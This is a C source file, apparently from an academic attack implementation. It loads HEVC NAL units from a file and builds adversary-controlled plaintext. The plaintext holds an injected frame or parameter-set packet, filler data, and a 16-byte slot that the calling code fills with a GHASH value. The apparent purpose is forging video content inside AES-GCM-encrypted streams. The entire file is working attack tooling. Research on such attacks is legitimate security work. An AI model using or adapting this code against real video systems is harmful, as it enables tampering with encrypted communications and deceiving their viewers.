/* adversary_nals.c — see adversary_nals.h for the API. */

#include "adversary_nals.h"

#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* One NAL = raw bytes (no start code), known length. */
typedef struct {
    uint8_t *bytes;
    size_t   len;
} nal_t;

static struct {
    pthread_mutex_t lock;
    nal_t   *items;
    size_t   n;
    size_t   cap;
    size_t   cursor;   /* round-robin position */
    int      loaded;
} g_q = { .lock = PTHREAD_MUTEX_INITIALIZER, .items = NULL };

/* ----- Annex-B parser ----- */

/* Returns the offset of the *next* start code (3- or 4-byte), or
 * file_len if none found. Writes the start-code length into *sc_len. */
static size_t find_start_code(const uint8_t *buf, size_t off, size_t end,
                              size_t *sc_len) {
    for (size_t i = off; i + 3 <= end; i++) {
        if (buf[i] == 0x00 && buf[i + 1] == 0x00) {
            if (buf[i + 2] == 0x01) {
                *sc_len = 3;
                return i;
            }
            if (i + 4 <= end && buf[i + 2] == 0x00 && buf[i + 3] == 0x01) {
                *sc_len = 4;
                return i;
            }
        }
    }
    return end;
}

static int append_nal(const uint8_t *bytes, size_t len) {
    pthread_mutex_lock(&g_q.lock);
    if (g_q.n == g_q.cap) {
        size_t new_cap = g_q.cap ? g_q.cap * 2 : 64;
        nal_t *grown = (nal_t *)realloc(g_q.items, new_cap * sizeof(nal_t));
        if (!grown) { pthread_mutex_unlock(&g_q.lock); return -1; }
        g_q.items = grown;
        g_q.cap = new_cap;
    }
    uint8_t *copy = (uint8_t *)malloc(len);
    if (!copy) { pthread_mutex_unlock(&g_q.lock); return -1; }
    memcpy(copy, bytes, len);
    g_q.items[g_q.n].bytes = copy;
    g_q.items[g_q.n].len = len;
    g_q.n++;
    pthread_mutex_unlock(&g_q.lock);
    return 0;
}

int adversary_nals_load(const char *path) {
    pthread_mutex_lock(&g_q.lock);
    int already = g_q.loaded;
    pthread_mutex_unlock(&g_q.lock);
    if (already) return 0;

    FILE *f = fopen(path, "rb");
    if (!f) {
        fprintf(stderr, "[adversary-nals] fopen(%s) failed\n", path);
        return -1;
    }
    fseek(f, 0, SEEK_END);
    long sz = ftell(f);
    fseek(f, 0, SEEK_SET);
    if (sz <= 0) { fclose(f); return -2; }
    uint8_t *buf = (uint8_t *)malloc((size_t)sz);
    if (!buf) { fclose(f); return -3; }
    if (fread(buf, 1, (size_t)sz, f) != (size_t)sz) {
        free(buf); fclose(f); return -4;
    }
    fclose(f);

    /* Parse Annex-B. */
    size_t pos = 0, end = (size_t)sz, sc_len = 0;
    pos = find_start_code(buf, 0, end, &sc_len);
    while (pos < end) {
        size_t nal_start = pos + sc_len;
        size_t next_sc_len = 0;
        size_t next_pos = find_start_code(buf, nal_start, end, &next_sc_len);
        size_t nal_len = next_pos - nal_start;
        if (nal_len > 0) {
            append_nal(buf + nal_start, nal_len);
        }
        pos = next_pos;
        sc_len = next_sc_len;
    }
    free(buf);

    pthread_mutex_lock(&g_q.lock);
    g_q.loaded = 1;
    size_t n = g_q.n;
    pthread_mutex_unlock(&g_q.lock);
    fprintf(stderr, "[adversary-nals] loaded %zu NALs from %s\n", n, path);
    return 0;
}

int adversary_nals_ready(void) {
    pthread_mutex_lock(&g_q.lock);
    int r = g_q.loaded && g_q.n > 0;
    pthread_mutex_unlock(&g_q.lock);
    return r;
}

const uint8_t *adversary_nals_next(size_t *out_len) {
    pthread_mutex_lock(&g_q.lock);
    if (!g_q.loaded || g_q.n == 0) {
        pthread_mutex_unlock(&g_q.lock);
        return NULL;
    }
    size_t idx = g_q.cursor;
    g_q.cursor = (g_q.cursor + 1) % g_q.n;
    const uint8_t *p = g_q.items[idx].bytes;
    *out_len = g_q.items[idx].len;
    pthread_mutex_unlock(&g_q.lock);
    return p;
}

/* ----- Plaintext layout ----- */

#define START_CODE_LEN 3
#define FD_NUT_HDR_LEN 2

/* ---- AP-format support (paper §5.4.2.1 Validity Preservation) ---- */

static struct {
    pthread_mutex_t lock;
    uint8_t vps[128]; size_t vps_len;
    uint8_t sps[256]; size_t sps_len;
    uint8_t pps[64];  size_t pps_len;
    nal_t *idrs;      /* dynamic array of IDR slices */
    size_t n_idrs;
    size_t cap_idrs;
    size_t cursor;
    int loaded;
} g_ap = { .lock = PTHREAD_MUTEX_INITIALIZER, .idrs = NULL };

static int nal_type_of(const uint8_t *nal_first_byte) {
    return (nal_first_byte[0] >> 1) & 0x3F;
}

static int ap_append_idr(const uint8_t *bytes, size_t len) {
    if (g_ap.n_idrs == g_ap.cap_idrs) {
        size_t new_cap = g_ap.cap_idrs ? g_ap.cap_idrs * 2 : 64;
        nal_t *grown = (nal_t *)realloc(g_ap.idrs, new_cap * sizeof(nal_t));
        if (!grown) return -1;
        g_ap.idrs = grown;
        g_ap.cap_idrs = new_cap;
    }
    uint8_t *copy = (uint8_t *)malloc(len);
    if (!copy) return -1;
    memcpy(copy, bytes, len);
    g_ap.idrs[g_ap.n_idrs].bytes = copy;
    g_ap.idrs[g_ap.n_idrs].len   = len;
    g_ap.n_idrs++;
    return 0;
}

int adversary_idr_stream_load(const char *path) {
    pthread_mutex_lock(&g_ap.lock);
    int already = g_ap.loaded;
    pthread_mutex_unlock(&g_ap.lock);
    if (already) return 0;

    FILE *f = fopen(path, "rb");
    if (!f) {
        fprintf(stderr, "[adversary-nals] AP load: fopen(%s) failed\n", path);
        return -1;
    }
    fseek(f, 0, SEEK_END);
    long sz = ftell(f);
    fseek(f, 0, SEEK_SET);
    if (sz <= 0) { fclose(f); return -2; }
    uint8_t *buf = (uint8_t *)malloc((size_t)sz);
    if (!buf) { fclose(f); return -3; }
    if (fread(buf, 1, (size_t)sz, f) != (size_t)sz) {
        free(buf); fclose(f); return -4;
    }
    fclose(f);

    pthread_mutex_lock(&g_ap.lock);
    g_ap.vps_len = g_ap.sps_len = g_ap.pps_len = 0;

    size_t pos = 0, end = (size_t)sz, sc_len = 0;
    pos = find_start_code(buf, 0, end, &sc_len);
    while (pos < end) {
        size_t nal_start = pos + sc_len;
        size_t next_sc_len = 0;
        size_t next_pos = find_start_code(buf, nal_start, end, &next_sc_len);
        size_t nal_len = next_pos - nal_start;
        if (nal_len > 0) {
            int nt = nal_type_of(buf + nal_start);
            switch (nt) {
                case 32: /* VPS */
                    if (g_ap.vps_len == 0 && nal_len <= sizeof(g_ap.vps)) {
                        memcpy(g_ap.vps, buf + nal_start, nal_len);
                        g_ap.vps_len = nal_len;
                    }
                    break;
                case 33: /* SPS */
                    if (g_ap.sps_len == 0 && nal_len <= sizeof(g_ap.sps)) {
                        memcpy(g_ap.sps, buf + nal_start, nal_len);
                        g_ap.sps_len = nal_len;
                    }
                    break;
                case 34: /* PPS */
                    if (g_ap.pps_len == 0 && nal_len <= sizeof(g_ap.pps)) {
                        memcpy(g_ap.pps, buf + nal_start, nal_len);
                        g_ap.pps_len = nal_len;
                    }
                    break;
                case 19: case 20: /* IDR_W_RADL, IDR_N_LP */
                    ap_append_idr(buf + nal_start, nal_len);
                    break;
                default:
                    /* skip TRAIL_N/R, PREFIX_SEI, etc. */
                    break;
            }
        }
        pos = next_pos;
        sc_len = next_sc_len;
    }
    free(buf);

    int ok = (g_ap.vps_len > 0 && g_ap.sps_len > 0 && g_ap.pps_len > 0 && g_ap.n_idrs > 0);
    if (ok) g_ap.loaded = 1;
    size_t nv = g_ap.vps_len, ns = g_ap.sps_len, np = g_ap.pps_len, ni = g_ap.n_idrs;
    pthread_mutex_unlock(&g_ap.lock);

    fprintf(stderr,
            "[adversary-nals] AP stream %s VPS=%zuB SPS=%zuB PPS=%zuB IDRs=%zu from %s\n",
            ok ? "loaded:" : "INCOMPLETE:", nv, ns, np, ni, path);
    return ok ? 0 : -5;
}

int adversary_idr_stream_ready(void) {
    pthread_mutex_lock(&g_ap.lock);
    int r = g_ap.loaded && g_ap.n_idrs > 0;
    pthread_mutex_unlock(&g_ap.lock);
    return r;
}

#define AP_OVERHEAD_PER_NAL    2u   /* 2-byte length prefix per NAL inside AP */
#define AP_HEADER_LEN          2u   /* AP NAL header (type=48) */

int build_adversary_ap_plaintext(size_t target_len, uint8_t *out_buf,
                                 size_t *out_adj_off) {
    if (!out_buf || !out_adj_off) return -1;
    if (target_len == 0 || (target_len % 16) != 0) return -1;

    pthread_mutex_lock(&g_ap.lock);
    if (!g_ap.loaded || g_ap.n_idrs == 0) {
        pthread_mutex_unlock(&g_ap.lock);
        return -1;
    }

    /* Pick the next IDR slice round-robin. */
    size_t idx = g_ap.cursor;
    g_ap.cursor = (g_ap.cursor + 1) % g_ap.n_idrs;
    size_t vps_len = g_ap.vps_len, sps_len = g_ap.sps_len, pps_len = g_ap.pps_len;
    size_t idr_len = g_ap.idrs[idx].len;
    const uint8_t *vps = g_ap.vps, *sps = g_ap.sps, *pps = g_ap.pps;
    const uint8_t *idr = g_ap.idrs[idx].bytes;
    pthread_mutex_unlock(&g_ap.lock);

    /* Compute byte offsets within the AP packet. */
    size_t off_vps     = AP_HEADER_LEN + AP_OVERHEAD_PER_NAL;
    size_t off_sps_len = off_vps + vps_len;
    size_t off_sps     = off_sps_len + AP_OVERHEAD_PER_NAL;
    size_t off_pps_len = off_sps + sps_len;
    size_t off_pps     = off_pps_len + AP_OVERHEAD_PER_NAL;
    size_t off_idr_len = off_pps + pps_len;
    size_t off_idr     = off_idr_len + AP_OVERHEAD_PER_NAL;
    size_t off_fdnut_len_prefix = off_idr + idr_len;
    size_t off_fdnut   = off_fdnut_len_prefix + AP_OVERHEAD_PER_NAL;
    /* FD_NUT NAL header (2 B), then filler, then adj slot. */
    size_t fdnut_filler_start = off_fdnut + FD_NUT_HDR_LEN;
    /* adj_off = smallest 16-aligned position >= fdnut_filler_start. */
    size_t adj_off = (fdnut_filler_start + 15) & ~((size_t)15);
    /* Must leave at least 1 trailing byte (0x80) after the adjustment slot. */
    if (adj_off + 16 + 1 > target_len) {
        return -1;  /* doesn't fit — caller should pass-through */
    }
    /* The FD_NUT NAL's content occupies target_len - off_fdnut bytes. */
    size_t fdnut_content_len = target_len - off_fdnut;
    /* AP requires FD_NUT length prefix to be ≤ 65535 (uint16). */
    if (fdnut_content_len > 0xFFFFu) return -1;

    /* Now write everything. */
    size_t p = 0;
    /* AP NAL header — F=0, Type=48 (AP), LayerId=0, TID=1 */
    out_buf[p++] = 0x60;
    out_buf[p++] = 0x01;
    /* VPS */
    out_buf[p++] = (uint8_t)((vps_len >> 8) & 0xFF);
    out_buf[p++] = (uint8_t)(vps_len & 0xFF);
    memcpy(out_buf + p, vps, vps_len); p += vps_len;
    /* SPS */
    out_buf[p++] = (uint8_t)((sps_len >> 8) & 0xFF);
    out_buf[p++] = (uint8_t)(sps_len & 0xFF);
    memcpy(out_buf + p, sps, sps_len); p += sps_len;
    /* PPS */
    out_buf[p++] = (uint8_t)((pps_len >> 8) & 0xFF);
    out_buf[p++] = (uint8_t)(pps_len & 0xFF);
    memcpy(out_buf + p, pps, pps_len); p += pps_len;
    /* IDR slice */
    out_buf[p++] = (uint8_t)((idr_len >> 8) & 0xFF);
    out_buf[p++] = (uint8_t)(idr_len & 0xFF);
    memcpy(out_buf + p, idr, idr_len); p += idr_len;
    /* FD_NUT length prefix + NAL header + filler/adj/trailing */
    out_buf[p++] = (uint8_t)((fdnut_content_len >> 8) & 0xFF);
    out_buf[p++] = (uint8_t)(fdnut_content_len & 0xFF);
    /* FD_NUT NAL header */
    out_buf[p++] = 0x4C;
    out_buf[p++] = 0x01;
    /* 0xFF filler up to adj_off */
    while (p < adj_off) out_buf[p++] = 0xFF;
    /* Zero-init the 16-byte adjustment slot (caller fills with GHASH X). */
    memset(out_buf + p, 0x00, 16); p += 16;
    /* 0xFF filler up to the last byte */
    while (p < target_len - 1) out_buf[p++] = 0xFF;
    /* rbsp_trailing_bits */
    out_buf[target_len - 1] = 0x80;

    *out_adj_off = adj_off;
    return 0;
}

int build_adversary_plaintext(const uint8_t *adversary_nal, size_t nal_len,
                              size_t target_len, uint8_t *out_buf,
                              size_t *out_adj_off) {
    if (!adversary_nal || !out_buf || !out_adj_off) return -1;
    if (target_len == 0 || (target_len % 16) != 0) return -1;

    /* Fixed prefix before the variable filler region:
     *   [3] start code
     *   [nal_len] adversary NAL
     *   [3] start code
     *   [2] FD_NUT header */
    size_t fixed_pre = START_CODE_LEN + nal_len + START_CODE_LEN + FD_NUT_HDR_LEN;
    /* The adjustment slot lives inside the FD_NUT filler. It must be
     * 16-byte aligned, fully contained in target_len, and leave at
     * least one byte at the end for the 0x80 trailer. */
    size_t adj_off = (fixed_pre + 15) & ~((size_t)15);   /* round up */
    if (adj_off + 16 + 1 > target_len) {
        /* No room for adversary NAL + alignment + adjustment slot +
         * trailer within target_len. Caller should pass-through. */
        return -1;
    }

    /* Lay everything out. */
    size_t p = 0;
    out_buf[p++] = 0x00; out_buf[p++] = 0x00; out_buf[p++] = 0x01;
    memcpy(out_buf + p, adversary_nal, nal_len);
    p += nal_len;
    out_buf[p++] = 0x00; out_buf[p++] = 0x00; out_buf[p++] = 0x01;
    out_buf[p++] = 0x4C; out_buf[p++] = 0x01;  /* HEVC FD_NUT header */

    /* 0xFF filler from p to adj_off (filler_data() is a run of 0xFF). */
    memset(out_buf + p, 0xFF, adj_off - p);
    /* Adjustment slot — caller will fill in the GHASH solution; we
     * zero-init for sanity / debugging. */
    memset(out_buf + adj_off, 0x00, 16);
    /* 0xFF filler from adj_off+16 to target_len-1. */
    memset(out_buf + adj_off + 16, 0xFF, target_len - 1 - (adj_off + 16));
    /* Trailer. */
    out_buf[target_len - 1] = 0x80;

    *out_adj_off = adj_off;
    return 0;
}
